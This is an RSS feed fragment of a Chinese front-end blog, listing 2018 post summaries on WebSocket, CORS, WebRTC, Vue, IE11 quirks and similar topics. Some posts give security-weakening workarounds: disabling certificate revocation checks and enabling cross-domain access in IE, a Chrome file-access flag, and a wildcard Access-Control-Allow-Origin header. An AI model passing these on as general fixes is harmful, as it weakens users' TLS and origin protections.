状态码 名称 描述 0–999 保留段, 未使用. 1000 CLOSE_NORMAL 正常关闭; 无论为何目的而创建, 该链接都已成功完成任务. 1001 CLOSE_GOING_AWAY 终端离开, 可能因为服务端错误, 也可能因为浏览器正从打开连接的页面跳转离开. 1002 CLOSE_PROTOCOL_ERROR 由于协议错误而中断连接. 1003 CLOSE_UNSUPPORTED 由于接收到不允许的数据类型而断开连接 (如仅接收文本数据的终端接收到了二进制数据). 1004 保留. 其意义可能会在未来定义. 1005 CLOSE_NO_STATUS 保留. 表示没有收到预期的状态码. 1006 CLOSE_ABNORMAL 保留. 用于期望收到状态码时连接非正常关闭 (也就是说, 没有发送关闭帧).</description>
    </item>
    
    <item>
      <title>js中的真值和假值</title>
      <link>https://wdd.js.org/posts/2018/js-true-and-false-value/</link>
      <pubDate>Tue, 27 Mar 2018 14:31:01 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2018/js-true-and-false-value/</guid>
      <description>无论什么语言，都需要逻辑，而逻辑中，能否判断出真假，是最基本也是最重要技能之一。
JS中的假值有6个 false &#39;&#39; undefinded null 0, +0, -0 NaN 有点类似假值的真值有两个 {} [] 空对象和空数组，很多初学者都很用把这两个当做假值。但是实际上他们是真值，你只需要记住，除了null之外的所有对象类型的数据，都是真值。
typeof null // &amp;#39;object&amp;#39; 据说：typeof null返回对象这是一个js语言中的bug。实际上typeof null应该返回null才比较准确，但是这个bug已经存来好久了。几乎所有的代码里都这样去判断。如果把typeof null给改成返回null, 那么这必定会导致JS世界末日。
我们承认JS并不完美，她有很多小缺点，但是这并不妨碍她吸引万千开发者拜倒在她的石榴裙下。
就像一首歌唱的：有些人说不清哪里好 但就是谁都替代不了</description>
    </item>
    
    <item>
      <title>在实践中我遇到stompjs, websocket和nginx的问题与总结</title>
      <link>https://wdd.js.org/posts/2018/stomp-over-websocket/</link>
      <pubDate>Tue, 20 Mar 2018 22:09:34 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2018/stomp-over-websocket/</guid>
      <description>1. AWS EC2 不支持WebSocket 直达解决方案 英文版
简单说一下思路：WebSocket底层基于TCP协议的，如果你的服务器基于HTTP协议暴露80端口，那WebSocket肯定无法连接。你只要将HTTP协议修改成TCP协议就可以了。
然后是安全组的配置：
同样如果使用了NGINX作为反向代理，那么NGINX也需要做配置的。
// https://gist.githubusercontent.com/unshift/324be6a8dc9e880d4d670de0dc97a8ce/raw/29507ed6b3c9394ecd7842f9d3228827cffd1c58/elasticbeanstalk_websockets files: &amp;#34;/etc/nginx/conf.d/01_websockets.conf&amp;#34; : mode: &amp;#34;000644&amp;#34; owner: root group: root content : | upstream nodejs { server 127.0.0.1:8081; keepalive 256; } server { listen 8080; location / { proxy_pass http://nodejs; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection &amp;#34;upgrade&amp;#34;; proxy_http_version 1.1; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; } } &amp;#34;/opt/elasticbeanstalk/hooks/appdeploy/enact/41_remove_eb_nginx_confg.sh&amp;#34;: mode: &amp;#34;000755&amp;#34; owner: root group: root content : | mv /etc/nginx/conf.</description>
    </item>
    
    <item>
      <title>状态码为200时 jQuery ajax报错</title>
      <link>https://wdd.js.org/posts/2018/status-code-200-jquery-ajax-failed/</link>
      <pubDate>Thu, 15 Mar 2018 14:17:59 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2018/status-code-200-jquery-ajax-failed/</guid>
      <description>1. 问题现象 HTTP 状态码为 200 OK 时， jquery ajax报错
2. 问题原因 jquery ajax的dataType字段包含：json, 但是服务端返回的数据不是规范的json格式，导致jquery解析json字符串报错，最终导致ajax报错。
jQuery ajax 官方文档上说明：
&amp;ldquo;json&amp;rdquo;: Evaluates the response as JSON and returns a JavaScript object. Cross-domain &amp;ldquo;json&amp;rdquo; requests are converted to &amp;ldquo;jsonp&amp;rdquo; unless the request includes jsonp: false in its request options. The JSON data is parsed in a strict manner; any malformed JSON is rejected and a parse error is thrown. As of jQuery 1.9, an empty response is also rejected; the server should return a response of null or {} instead.</description>
    </item>
    
    <item>
      <title>前端剪贴板复制功能实现原理</title>
      <link>https://wdd.js.org/posts/2018/clipboard-copy-tutorial/</link>
      <pubDate>Wed, 14 Mar 2018 14:19:12 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2018/clipboard-copy-tutorial/</guid>
      <description>1. 兼容情况 如果想浏览器支持粘贴功能，那么浏览器必须支持，document.execCommand(&amp;lsquo;copy&amp;rsquo;)方法，也可以根据document.queryCommandEnabled(&amp;lsquo;copy&amp;rsquo;)，返回的true或者false判断浏览器是否支持copy命令。
从下表可以看出，主流的浏览器都支持execCommand命令
2. 复制的原理 查询元素 选中元素 执行复制命令 3. 代码展示 // html &amp;lt;input id=&amp;#34;username&amp;#34; value=&amp;#34;123456&amp;#34;&amp;gt; // 查询元素 var username = document.getElementById(‘username’) // 选中元素 username.select() // 执行复制 document.execCommand(&amp;#39;copy&amp;#39;) 注意: 以上代码只是简单示意，在实践过程中还有几个要判断的情况
首要要去检测浏览器execCommand能力检测 选取元素时，有可能选取元素为空，要考虑这种情况的处理 4. 第三方方案 clipboard.js是一个比较方便的剪贴板库，功能蛮多的。
&amp;lt;!-- Target --&amp;gt; &amp;lt;textarea id=&amp;#34;bar&amp;#34;&amp;gt;Mussum ipsum cacilds...&amp;lt;/textarea&amp;gt; &amp;lt;!-- Trigger --&amp;gt; &amp;lt;button class=&amp;#34;btn&amp;#34; data-clipboard-action=&amp;#34;cut&amp;#34; data-clipboard-target=&amp;#34;#bar&amp;#34;&amp;gt; Cut to clipboard &amp;lt;/button&amp;gt; 官方给的代码里有上面的一个示例，如果你用了这个示例，但是不起作用，那你估计是没有初始化ClipboardJS示例的。
注意：下面的函数必须要主动调用，这样才能给响应的DOM元素注册事件。 ClipboardJS源代码压缩后大约有3kb，虽然很小了，但是如果你不需要它的这么多功能的话，其实你自己写几行代码就可以搞定复制功能。
new ClipboardJS(&amp;#39;.btn&amp;#39;); </description>
    </item>
    
    <item>
      <title>Chrome本地跨域origin-null-is-not-allowed问题分析与解决方案</title>
      <link>https://wdd.js.org/posts/2018/origin-null-is-not-allowed/</link>
      <pubDate>Fri, 09 Mar 2018 17:58:05 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2018/origin-null-is-not-allowed/</guid>
      <description>1. 问题表现 以file:///xxx.html打开某个html文件，发送ajax请求时报错：
Response to preflight request doesn&amp;#39;t pass access control check: The &amp;#39;Access-Control-Allow-Origin&amp;#39; header has a value &amp;#39;null&amp;#39; that is not equal to the supplied origin. Origin &amp;#39;null&amp;#39; is therefore not allowed access. 2. 问题原因 Origin null是本地文件系统，因此这表明您正在加载通过file：// URL进行加载调用的HTML页面（例如，只需在本地文件浏览器或类似文件中双击它）。不同的浏览器采用不同的方法将相同来源策略应用到本地文件。Chrome要求比较严格，不允许这种形势的跨域请求。而最好使用http:// 访问html.
3. 解决方案 以下给出三个解决方案，第一个最快，第三个作为彻底。
3.1. 方案1 给Chrome快捷方式中增加 &amp;ndash;allow-file-access-from-files 打开Chrome快捷方式的属性中设置：右击Chrome浏览器快捷方式，选择“属性”，在“目标”中加&amp;quot;&amp;ndash;allow-file-access-from-files&amp;quot;，注意前面有个空格，重启Chrome浏览器便可。
3.2. 方案2 启动一个简单的静态文件服务器, 以http协议访问html 参见我的这篇文章: 一行命令搭建简易静态文件http服务器
3.3. 方案3 服务端响应修改Access-Control-Allow-Origin : * response.addHeader(&amp;#34;Access-Control-Allow-Origin&amp;#34;,&amp;#34;*&amp;#34;) 4. 参考文章 如何解决XMLHttpRequest cannot load file~~~~~~~Origin &amp;rsquo;null&amp;rsquo; is therefore not allowed access 让chrome支持本地Ajax请求,Ajax请求status cancel Origin null is not allowed by Access-Control-Allow-Origin Origin null is not allowed by Access-Control-Allow-Origin </description>
    </item>
    
    <item>
      <title>正则表达式在线工具集合</title>
      <link>https://wdd.js.org/posts/2018/regex-online-tools/</link>
      <pubDate>Sat, 24 Feb 2018 15:27:24 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2018/regex-online-tools/</guid>
      <description>1. 功能最强：regex101 优点：
支持多种语言, prec,php,javascript,python,golang 界面美观大方 支持错误提示，实时匹配 缺点：
有时候加载速度太慢 2. 可视化正则绘图: Regulex 优点：
实时根据正则表达式绘图 页面加载速度快 3. 可视化正则绘图：regexper 优点：
根据正则表达式绘图 页面加载速度快 缺点：
无法实时绘图，需要点击才可以 4. 专注于python正则：pyregex 专注python 页面加载速度快 </description>
    </item>
    
    <item>
      <title>前端面试和笔试题目</title>
      <link>https://wdd.js.org/posts/2018/front-end-interview-handbook/</link>
      <pubDate>Fri, 23 Feb 2018 15:18:26 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2018/front-end-interview-handbook/</guid>
      <description>1. 问答题 1.1. HTML相关 1.1.1. 的作用是什么？ 1.1.2. script, script async和script defer之间有什么区别？ 1.1.3. cookie, sessionStorage 和 localStorage之间有什么区别？ 1.1.4. 用过哪些html模板渲染工具？ 1.2. CSS相关 1.2.1. 简述CSS盒子模型 1.2.2. CSS有哪些选择器？ 1.2.3. CSS sprite是什么？ 1.2.4. 写一下你知道的前端UI框架？ 1.3. JS相关 1.3.1. js有哪些数据类型？ 1.3.2. js有哪些假值？ 1.3.3. js数字和字符串之间有什么快速转换的写法？ 1.3.4. 经常使用哪些ES6的语法？ 1.3.5. 什么是同源策略？ 1.3.6. 跨域有哪些解决方法？ 1.3.7. 网页进度条实现的原理 1.3.8. 请问console.log是同步的，还是异步的？ 1.3.9. 下面console输出的值是什么？ var scores = [10,11,12]; var total = 0; for(var score in scores){ total += score; } var average = total/scores.length; console.log(average); 1.</description>
    </item>
    
    <item>
      <title>small is better than big 我的读书方法论</title>
      <link>https://wdd.js.org/posts/2018/small-is-better-than-big/</link>
      <pubDate>Tue, 13 Feb 2018 14:57:23 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2018/small-is-better-than-big/</guid>
      <description>床底下秘密 我是一个毅力不是很够的人。我曾经下定决心要锻炼身体，买了一些健身器材，例如瑜伽垫，仰卧起坐的器材，俯卧撑的器材。然而三分钟的热度过后，我把瑜伽垫卷了起来，塞到床底下。把仰卧起坐的器材拆开，也塞到了床底下。
所以每次我都不敢看床底下，那里塞满了我的羞愧。我常常想，我这不就是永远睡在羞愧之上吗？
那么，是什么让我放弃了自己的目标，慢慢活成了自己讨厌的样子呢？
之前和朋友聊天，我们有一段时间没见了。我突然觉得他也太能聊了，说了很多我不知道的新鲜事，还有一些可以让人茅塞顿开的想法。完了之后，他劝我让我多读书。我觉得这个想法很多。我是确实需要读书了。毕竟我的床底下已经没有空间再塞其他的东西了。
于是我在多看阅读上买了一下电子书，在京东上买了一些实体书，然后又买了一个kindle。在读书的过程中，有时候作者也会推荐你看一些其他的书。我给自己定了2018年我的阅读计划，给自己定下要看哪些书。
看书的方法 当我决定要看书，并且为此付出了不少的金钱的情况下。我是非常不愿因让我的金钱的付出白白打水漂的，毕竟买书以及买设备，这不是免费的服务。于是我给自己指定了一个非常完善的定量阅读标准
读书方法v1.0.0 版 如下
每天至少看三本书 每本书看50页 人要有标准才能判断是否达标，没有标准，没有数字化的支撑，那是很难以持续的。比如说中国的菜谱，做某道菜中写了一句：加入少许盐。中国人看了会想，那我就按照口味随便加点盐吧。外国人就会被搞得非常迷糊，少许是多少克盐？ 20g, 30g? 完全没有标准嘛。
按照读书方法 v1.0.0版，我看了几天，这个效果是很好的。但是我很累，电子书50页可不是个小数目。有时候很难完成的。于是我必须要升级我的读书方法。
读书方法v1.0.1 版 如下
每天至少看三本书 每本书看10页 按照读书方法v1.0.1 版，我看了几天，虽然读书的进度很慢，但是我很容易有满足感，因为这个目标是很容易就达成的。因为你随便去上个厕所，看个10页电子书也是绰绰有余的。但是这个版本也有个问题。
如果我今天看的这本书看的流连忘返，一不小心忘记看页码了，居然不知不觉读了38页，那么是不是已经消耗了未来几天的阅读量呢，明天这本书要不要度呢？ 所以，我要升级我的读书方法。
读书方法v1.0.2版：
每天至少读三本书 每本书至少读10页 我按照这个方法，感觉做的不错。每天都有一定的阅读量要看，而且阅读量不是很大，不会让我觉得很累。而且当我完成了这个目标，我是会获得不小的满足感。
大目标分解成小目标去逐个击破，这是我这篇文章的核心观点。
冲量公式 I = F x T 冲量是力的时间累积效应的量度，是矢量。如果物体所受的力是大小和方向都不变的恒力F，冲量I就是F和作用时间t的乘积。 冲量是描述力对物体作用的时间累积效应的物理量。力的冲量是一个过程量。在谈及冲量时，必须明确是哪个力在哪段时间上的冲量。
个人好习惯的养成，不是一蹴而就的，而是类似于物理学冲量的概念：力在一段时间内的累积，是过程量
三分钟的热度对应的冲量：I = F_max x T_min。使用很大的力，作用时间超短，基本上没啥效果，冲量趋近于零。
微习惯对应的冲量：I = F_min x T_max。使用很小的力，做长时间的积累。冲量不会趋近于零，而是会慢慢增长，然后趋近于一个稳定水平。比如你给自己规定每天看1页书，但是大多数情况下，如果你做了看书的动作，基本上你看书的页数一定会大于1页。
看什么样的书 我自己喜欢看计算机，心理学，历史人文方面的出版书籍。而我的选择标准有两个，符合任一一个，我都会去看。
要有用。无论是对我的专业知识，还是对人际交往，金融理财等方面要用有益之处 要有趣。没趣的书我是断然不会去看的。 读书实际上是读人，一流作家写的一流的书，三流作家只能写出九流的书。</description>
    </item>
    
    <item>
      <title>基于 WebRTC 构建 Web SIP Phone</title>
      <link>https://wdd.js.org/posts/2018/webrtc-web-sip-phone/</link>
      <pubDate>Sun, 11 Feb 2018 14:44:58 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2018/webrtc-web-sip-phone/</guid>
      <description>0 阅前须知 本文并不是教程，只是实现方案 我只是从WEB端考虑这个问题，实际还需要后端sip服务器的配合 jsSIP有个非常不错的在线demo, 可以去哪里玩耍，很好玩呢 try jssip 1. 技术简介 WebRTC: WebRTC，名称源自网页即时通信（英语：Web Real-Time Communication）的缩写，是一个支持网页浏览器进行实时语音对话或视频对话的API。它于2011年6月1日开源并在Google、Mozilla、Opera支持下被纳入万维网联盟的W3C推荐标准 SIP: 会话发起协议（Session Initiation Protocol，缩写SIP）是一个由IETF MMUSIC工作组开发的协议，作为标准被提议用于创建，修改和终止包括视频，语音，即时通信，在线游戏和虚拟现实等多种多媒体元素在内的交互式用户会话。2000年11月，SIP被正式批准成为3GPP信号协议之一，并成为IMS体系结构的一个永久单元。SIP与H.323一样，是用于VoIP最主要的信令协议之一。 一般来说，要么使用实体话机，要么在系统上安装基于sip的客户端程序。实体话机硬件成本高，基于sip的客户端往往兼容性差，无法跨平台，易被杀毒软件查杀。
而WebRTC或许是更好的解决方案，只要一个浏览器就可以实时语音视频通话，这是很不错的解决方案。WebSocket可以用来传递sip信令，而WebRTC用来实时传输语音视频流。
2. 前端WebRTC实现方案 其实我们不需要去自己处理WebRTC的相关方法，或者去处理视频或者媒体流。市面上已经有不错的模块可供选择。
2.1 jsSIP jsSIP是JavaScript SIP 库
功能特点如下：
可以在浏览器或者Nodejs中运行 使用WebSocket传递SIP协议 视频音频实时消息使用WebRTC 非常轻量 100%纯JavaScript 使用简单并且具有强大的Api 服务端支持 OverSIP, Kamailio, Asterisk, OfficeSIP，reSIProcate，Frafos ABC SBC，TekSIP 是RFC 7118 and OverSIP的作者写的 下面是使用JsSIP打电话的例子，非常简单吧
// Create our JsSIP instance and run it: var socket = new JsSIP.WebSocketInterface(&amp;#39;wss://sip.myhost.com&amp;#39;); var configuration = { sockets : [ socket ], uri : &amp;#39;sip:alice@example.</description>
    </item>
    
    <item>
      <title>不常用却很有妙用的事件及方法</title>
      <link>https://wdd.js.org/posts/2018/useful-browser-events/</link>
      <pubDate>Sun, 11 Feb 2018 14:34:17 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2018/useful-browser-events/</guid>
      <description>1 visibilitychange事件 触发条件：浏览器标签页被隐藏或显示的时候会触发visibilitychange事件.
使用场景：当标签页显示或者隐藏时，触发一些业务逻辑
document.addEventListener(&amp;#34;visibilitychange&amp;#34;, function() { console.log( document.visibilityState ); }); 2 storage事件 触发条件：使用localStorage or sessionStorage存储或者修改某个本地存储时
使用场景：标签页间通信
// AB页面同源 // 在A 页面 window.addEventListener(&amp;#39;storage&amp;#39;, (e) =&amp;gt; {console.log(e)}) // 在B 页面，向120打个电话 localStorage.setItem(&amp;#39;makeCall&amp;#39;,&amp;#39;120&amp;#39;) // 然后可以在A页面间有输出, 可以看出A页面 收到了B页面的通知 ...key: &amp;#34;makeCall&amp;#34;, oldValue: &amp;#34;119&amp;#34;, newValue: &amp;#34;120&amp;#34;, ... 3 beforeunload事件 触发条件：当页面的资源将要卸载(及刷新或者关闭标签页前). 当页面依然可见，并且该事件可以被取消只时
使用场景：关闭或者刷新页面时弹窗确认，关闭页面时向后端发送报告等
window.addEventListener(&amp;#34;beforeunload&amp;#34;, function (e) { var confirmationMessage = &amp;#34;\o/&amp;#34;; e.returnValue = confirmationMessage; // Gecko, Trident, Chrome 34+ return confirmationMessage; // Gecko, WebKit, Chrome &amp;lt;34 }); 4 navigator.</description>
    </item>
    
    <item>
      <title>mac vscode 更新失败 Permission denied解决办法</title>
      <link>https://wdd.js.org/posts/2018/mac-vscode-update-permission-denied/</link>
      <pubDate>Sun, 11 Feb 2018 14:20:01 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2018/mac-vscode-update-permission-denied/</guid>
      <description>0. 现象 Could not create temporary directory: Permission denied
1. 问题起因 在 /Users/username/Library/Caches/目录下，有以下两个文件， 可以看到，他们两个的用户是不一样的，一个是root一个username, 一般来说，我是以username来使用我的mac的。就是因为这两个文件的用户不一样，导致了更新失败。
drwxr-xr-x 6 username staff 204B Jan 17 20:33 com.microsoft.VSCode drwxr--r-- 2 root staff 68B Dec 17 13:51 com.microsoft.VSCode.ShipIt 2. 解决方法 注意： 先把vscode 完全关闭
// 1. 这一步是需要输入密码的 sudo chown $USER ~/Library/Caches/com.microsoft.VSCode.ShipIt/ // 2. 这一步是不需要输入密码的, 如果不进行第一步，第二步会报错 sudo chown $USER ~/Library/Caches/com.microsoft.VSCode.ShipIt/* // 3. 更新xattr xattr -dr com.apple.quarantine /Applications/Visual\ Studio\ Code.app 3. 打开vscode Code &amp;gt; Check for Updates, 点击之后，你会发现Check for Updates已经变成灰色了，那么你需要稍等片刻，马上就可以更新，之后会跳出提示，让你重启vscode, 然后重启一下vscode, 就ok了。</description>
    </item>
    
    <item>
      <title>IE11 0x2ee4 bug 以及类似问题解决方法</title>
      <link>https://wdd.js.org/posts/2018/ie11-0x2ee4-bug/</link>
      <pubDate>Sun, 11 Feb 2018 14:12:19 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2018/ie11-0x2ee4-bug/</guid>
      <description>一千个IE浏览器访问同一个页面，可能报一千种错误。前端激进派对IE恨得牙痒痒，但是无论你爱，或者不爱，IE就在那里，不来不去。
一些银行，以及政府部门，往往都是指定必须使用IE浏览器。所以，一些仅在IE浏览器上出现的问题。总结起来问题的原因很简单：IE的配置不正确
下面就将一个我曾经遇到的问题: IE11 0x2ee4， 以及其他的问题的解决方案
1. IE11 SCRIPT7002: XMLHttpRequest: 网络错误 0x2ee4 背景介绍：在一个HTTPS域向另外一个HTTPS域发送跨域POTST请求时
这个问题在浏览器的输出内容如下，怪异的是，并不是所有IE11都会报这个错误。
SCRIPT7002: XMLHttpRequest: 网络错误 0x2ee4, 由于出现错误 00002ee4 而导致此项操作无法完成 stackoverflow上有个答案，它的思路是：在post请求发送之前，先进行一次get操作 这个方式我试过，是可行的。但是深层次的原因我不是很明白。
然而真相总有大白的一天，其实深层次的原因是，IE11的配置。
去掉检查证书吊销的的检查，解决0x2ee4的问题
解决方法
去掉check for server certificate revocation*， 也有可能你那边是中文翻译的：叫检查服务器证书是否已吊销 去掉检查发型商证书是否已吊销 点击确定 重启计算机 2 其他常规设置 2.1 去掉兼容模式， 使用Edge文档模式 下图中红色框里的按钮也要取消勾选 2.2 有些使用activeX，还是需要检查是否启用的 2.3 允许跨域 如果你的接口跨域了，还要检查浏览器是否允许跨域，否则浏览器可能默认就禁止跨域的
设置方法
internet选项 安全 自定义级别 启用通过跨域访问数据源 启用跨域浏览窗口和框架 确定 然后重启电脑 </description>
    </item>
    
    <item>
      <title>Vue&#43;ElementUI 手把手教你做一个audio组件</title>
      <link>https://wdd.js.org/posts/2018/vue-elementui-audio-component/</link>
      <pubDate>Fri, 09 Feb 2018 13:44:13 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2018/vue-elementui-audio-component/</guid>
      <description>1. 简介 1.1. 相关技术 Vue Vue-cli ElementUI yarn (之前我用npm, 并使用cnpm的源，但是用了yarn之后，我发现它比cnpm的速度还快，功能更好，我就毫不犹豫选择yarn了) Audio相关API和事件 1.2. 从本教程你会学到什么？ Vue单文件组件开发知识 Element UI基本用法 Audio原生API及Audio相关事件 音频播放器的基本原理 音频的播放暂停控制 更新音频显示时间 音频进度条控制与跳转 音频音量控制 音频播放速度控制 音频静音控制 音频下载控制 个性化配置与排他性播放 一点点ES6语法 2. 学前准备 基本上不需要什么准备，但是如果你能先看一下Aduio相关API和事件将会更好
Audio: 如果你愿意一层一层剥开我的心 使用 HTML5 音频和视频 3. 在线demon 没有在线demo的教程都是耍流氓
查看在线demon 项目地址 4. 开始编码 5. 项目初始化 ➜ test vue init webpack element-audio A newer version of vue-cli is available. latest: 2.9.2 installed: 2.9.1 ? Project name element-audio ? Project description A Vue.js project ?</description>
    </item>
    
    <item>
      <title>你不知道的JSON.stringify()妙用</title>
      <link>https://wdd.js.org/posts/2018/json-stringify-powerful/</link>
      <pubDate>Fri, 09 Feb 2018 13:27:15 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2018/json-stringify-powerful/</guid>
      <description>1. 语法 JSON.stringify(value[, replacer[, space]]) 一般用法：
var user = {name: &amp;#39;andy&amp;#39;, isDead: false, age: 11, addr: &amp;#39;shanghai&amp;#39;}; JSON.stringify(user); &amp;#34;{&amp;#34;name&amp;#34;:&amp;#34;andy&amp;#34;,&amp;#34;isDead&amp;#34;:false,&amp;#34;age&amp;#34;:11,&amp;#34;addr&amp;#34;:&amp;#34;shanghai&amp;#34;}&amp;#34; 2. 扩展用法 2.1. replacer replacer可以是函数或者是数组。
功能1: 改变属性值 将isDead属性的值翻译成0或1，0对应false,1对应true
var user = {name: &amp;#39;andy&amp;#39;, isDead: false, age: 11, addr: &amp;#39;shanghai&amp;#39;}; JSON.stringify(user, function(key, value){ if(key === &amp;#39;isDead&amp;#39;){ return value === true ? 1 : 0; } return value; }); &amp;#34;{&amp;#34;name&amp;#34;:&amp;#34;andy&amp;#34;,&amp;#34;isDead&amp;#34;:0,&amp;#34;age&amp;#34;:11,&amp;#34;addr&amp;#34;:&amp;#34;shanghai&amp;#34;}&amp;#34; 功能2：删除某个属性 将isDead属性删除，如果replacer的返回值是undefined,那么该属性会被删除。
var user = {name: &amp;#39;andy&amp;#39;, isDead: false, age: 11, addr: &amp;#39;shanghai&amp;#39;}; JSON.</description>
    </item>
    
    <item>
      <title>ECharts 轮流高亮中国地图各个省份</title>
      <link>https://wdd.js.org/posts/2018/echarts-highlight-china-map/</link>
      <pubDate>Fri, 09 Feb 2018 13:16:53 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2018/echarts-highlight-china-map/</guid>
      <description>1. 小栗子 最早我是想通过dispatchAction方法去改变选中的省份，但是没有起作用，如果你知道这个方法怎么实现，麻烦你可以告诉我。 我实现的方法是另外一种。
dispatchAction({ type: &amp;#39;geoSelect&amp;#39;, // 可选，系列 index，可以是一个数组指定多个系列 seriesIndex?: number|Array, // 可选，系列名称，可以是一个数组指定多个系列 seriesName?: string|Array, // 数据的 index，如果不指定也可以通过 name 属性根据名称指定数据 dataIndex?: number, // 可选，数据名称，在有 dataIndex 的时候忽略 name?: string }) 后来我改变了一个方法。这个方法的核心思路是定时获取图标的配置，然后更新配置，最后在设置配置。
var myChart = echarts.init(document.getElementById(&amp;#39;china-map&amp;#39;)); var COLORS = [&amp;#34;#070093&amp;#34;, &amp;#34;#1c3fbf&amp;#34;, &amp;#34;#1482e5&amp;#34;, &amp;#34;#70b4eb&amp;#34;, &amp;#34;#b4e0f3&amp;#34;, &amp;#34;#ffffff&amp;#34;]; // 指定图表的配置项和数据 var option = { tooltip: { trigger: &amp;#39;item&amp;#39;, formatter: &amp;#39;{b}&amp;#39; }, series: [ { name: &amp;#39;中国&amp;#39;, type: &amp;#39;map&amp;#39;, mapType: &amp;#39;china&amp;#39;, selectedMode : &amp;#39;single&amp;#39;, label: { normal: { show: true }, emphasis: { show: true } }, data:[ // 默认高亮安徽省 {name:&amp;#39;安徽&amp;#39;, selected:true} ], itemStyle: { normal: { areaColor: &amp;#39;rgba(255,255,255,0.</description>
    </item>
    
    <item>
      <title>一行命令搭建简易静态文件http服务器</title>
      <link>https://wdd.js.org/posts/2018/one-command-create-static-file-server/</link>
      <pubDate>Fri, 09 Feb 2018 13:01:14 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2018/one-command-create-static-file-server/</guid>
      <description>简易服务器：在命令执行的所在路径启动一个http服务器，然后你可以通过浏览器访问该路径下的所有文件。
在局域网内传文件，或者自己测试使用都是非常方便的。
1. 基于python 1.1. 基于Python2 python -m SimpleHTTPServer port
&amp;gt; python -m SimpleHTTPServer 8099 Serving HTTP on 0.0.0.0 port 8099 ... 127.0.0.1 - - [24/Oct/2017 11:07:56] &amp;#34;GET / HTTP/1.1&amp;#34; 200 - 1.2. 基于python3 python3 -m http.server port
&amp;gt; python3 -m http.server 8099 Serving HTTP on 0.0.0.0 port 8099 (http://0.0.0.0:8099/) ... 127.0.0.1 - - [24/Oct/2017 11:05:06] &amp;#34;GET / HTTP/1.1&amp;#34; 200 - 127.0.0.1 - - [24/Oct/2017 11:05:06] code 404, message File not found 127.</description>
    </item>
    
    <item>
      <title>120行代码实现 浏览器WebRTC视频聊天</title>
      <link>https://wdd.js.org/posts/2018/webrtc-tutorial-simple-video-chat/</link>
      <pubDate>Fri, 09 Feb 2018 12:56:12 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2018/webrtc-tutorial-simple-video-chat/</guid>
      <description>本例子是参考webrtc-tutorial-simple-video-chat做的。 这个教程应该主要是去宣传ScaleDrone的sdk, 他们的服务是收费的，但是免费的也可以用，就是有些次数限制。
本栗子的地址 本栗子的pages地址
因为使用的是ScaleDrone的js sdk, 后期很可能服务不稳定之类的
1. 准备 使用最新版谷歌浏览器（62版） 视频聊天中 一个是windows, 一个是mac stun服务器使用谷歌的，trun使用ScaleDrone的sdk，这样我就不用管服务端了。 2. 先上效果图 3. 再上在线例子点击此处 4. 源码分析 // 产生随机数 if (!location.hash) { location.hash = Math.floor(Math.random() * 0xFFFFFF).toString(16); } // 获取房间号 var roomHash = location.hash.substring(1); // 放置你自己的频道id, 这是我注册了ScaleDrone 官网后，创建的channel // 你也可以自己创建 var drone = new ScaleDrone(&amp;#39;87fYv4ncOoa0Cjne&amp;#39;); // 房间名必须以 &amp;#39;observable-&amp;#39;开头 var roomName = &amp;#39;observable-&amp;#39; + roomHash; var configuration = { iceServers: [{ urls: &amp;#39;stun:stun.l.google.com:19302&amp;#39; // 使用谷歌的stun服务 }] }; var room; var pc; function onSuccess() {} function onError(error) { console.</description>
    </item>
    
    <item>
      <title>如何写好技术文档?</title>
      <link>https://wdd.js.org/posts/2018/how-to-write-a-technical-document/</link>
      <pubDate>Fri, 09 Feb 2018 12:52:57 +0800</pubDate>
      
      <guid>https://wdd.js.org/posts/2018/how-to-write-a-technical-document/</guid>
      <description>本文来自于公司内部的一个分享。 在文档方面，对内的一些接口文档主要是用swagger来写的。虽然可以在线测试，比较方便。但是也存在着一些更新不及时，swgger文档无法导出成文件的问题。 在对外提供的文档方面：我主要负责做一个浏览器端的一个js sdk。文档还算可以github地址，所以想把一些写文档的心得分享给大家。
1. 衡量好文档的唯一标准是什么？ Martin(Bob大叔)曾在《代码整洁之道》一书打趣地说：当你的代码在做 Code Review 时，审查者要是愤怒地吼道：
“What the fuck is this shit?” “Dude, What the fuck！” 等言辞激烈的词语时，那说明你写的代码是 Bad Code，如果审查者只是漫不经心的吐出几个
“What the fuck?”，
那说明你写的是 Good Code。衡量代码质量的唯一标准就是每分钟骂出“WTF” 的频率。
衡量文档的标准也是如此。
2. 好文档的特点 简洁：一句话可以说完的事情，就不要分两句话来说。并不是文档越厚越好，太厚的文档大多没人看。 准确: 字段类型，默认值，备注，是否必填等属性说明。 逻辑性: 文档如何划分？ 利于查看。 demo胜千言: 好的demo胜过各种字段说明，可以复制下来直接使用。 读者心: 从读者的角度考虑, 方法尽量简洁。可以传递一个参数搞定的事情，绝对不要让用户去传两个参数。 及时更新: 不更新的文档比bug更严重。 向后兼容: 不要随意废弃已有的接口或者某个字段，除非你考虑到这样做的后果。 建立文档词汇表：每个概念只有一个名字，不要随意起名字，名不正则言不顺。 格式统一：例如时间格式。我曾见过2017-09-12 09:32:23, 或2017.09.12 09:32:23或2017.09.12 09:32:23。变量名user_name, userName。 使用专业词语：不要过于口语化 3. 总结: 写出好文档要有以下四点 逻辑性：便于查找 专业性: 值得信赖，质量保证 责任心：及时更新，准确性，向后兼容 读者心：你了解的东西，别人可能并不清楚。从读者的角度去考虑，他们需要什么，而不是一味去强调你能提供什么。 4. 写文档的工具 markdown: 方便快捷，可以导出各种格式的文件 swagger: 功能强大，需要部署，不方便传递文件 5.</description>
    </item>
    
    <item>
      <title>哑代理 - TCP链接高Recv-Q，内存泄露的罪魁祸首</title>
